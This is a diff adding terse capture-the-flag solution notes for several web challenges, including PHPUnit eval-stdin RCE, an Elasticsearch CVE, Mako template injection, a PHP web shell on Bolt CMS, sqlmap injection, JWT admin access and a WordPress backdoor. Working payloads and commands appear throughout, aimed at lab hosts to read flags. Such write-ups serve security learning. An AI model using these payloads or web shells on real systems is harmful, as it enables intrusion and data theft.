@@ -1,0 +1,79 @@
+PHP-UNIT
+	dirsearch -u
+
+	composer.json - find version
+	eval-stdin.php run burp with <?php system('cat /flag.txt') ?>
+
+ELASTIC
+	google build hash
+	found CVE-2015-5531
+	download script
+	run script URL COMMND
+
+SHARK
+	curl -I URL
+	Werkzeug is explotable with MAKO
+	Playload:
+		name=<%
+		import os
+		x=os.popen('cat flag').read()
+		%>
+		${x}
+
+ONLINE ENCRIPTION
+	filter http
+	172.217.20.19
+	UlBGUHtxcTU0NXNvczEyc3E2MDhxbm44cDIwMXM1MHM5NXA4NTIwb3JwOXM3NDRuMzU3M28xcXAwb3A1M3ByMDE5NzI2fQ%3D%3D
+
+	base64: RPFP{qq545sos12sq608qnn8p201s50s95p8520orp9s744n3573o1qp0op53pr019726}
+	ceasar cifer: ECSC{dd545fbf12fd608daa8c201f50f95c8520bec9f744a3573b1dc0bc53ce019726}
+ 
+BOLT
+	 /bolt
+	admin/password
+	<?php echo system($_GET['cmd']); ?>
+	http://34.107.71.117:32372/files/exploit.php?cmd=cat%20/flag.txt
+	///
+	curl http://34.107.71.117:32372/files/exploit.php?cmd=cat%20%2Fflag.txt   
+ 
+SCHEMATICS
+	register
+	login
+	copy cookie
+	sqlmap --cookie="2037b7b42d2e095388a624f8435658fb" -u http://34.107.71.117:31500/index.php --forms --columns
+	flag in table name and columns
+	CTF{1nformat1on_sch3ma_c4n__d4t4}
+
+AUTHORIZATION
+	sudo python3 dirsearch.py -u http://34.107.71.117:31284/
+	/client_secrets.json  - includes credintials
+	/console - tells us the site is written in flask, which means that data should be transported in dictionary format
+	/robots.txt /auth
+	/secrets - tells us that the sending methond is incorrect as well as jwt
+	/auth - access denied, because of wrong information/none
+	
+	we have to send data as admin to /auth to get jwt and then to access /secret
+	
+	Sending request to auth with post method and dictionary:
+		
+	Content-Type: application/json
+	Content-Length: 49
+
+	{
+		"username":"admin",
+		"password":"admin"
+	}
+	copy the jwt access token and send get request at /secrets
+	authorization:jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjA0NjcwNzgsImlhdCI6MTcyMDQ2Njc3OCwibmJmIjoxNzIwNDY2Nzc4LCJpZGVudGl0eSI6MX0.nw-Po5eHQGHMckppz9N301JjDIWZFnEmEInu27GzxKM
+
+NODIFFBACKDOOR
+	/backup.zip
+	extract, grep -r "shell_exec"
+	open backup/wp-cont/themes/2022/functions.php and find function called sentimental_function
+
+	in URL: http://34.107.71.117:32023/?welldone=knockknock&shazam=cat%20flag.php
+	and open source page
+
+
+
+
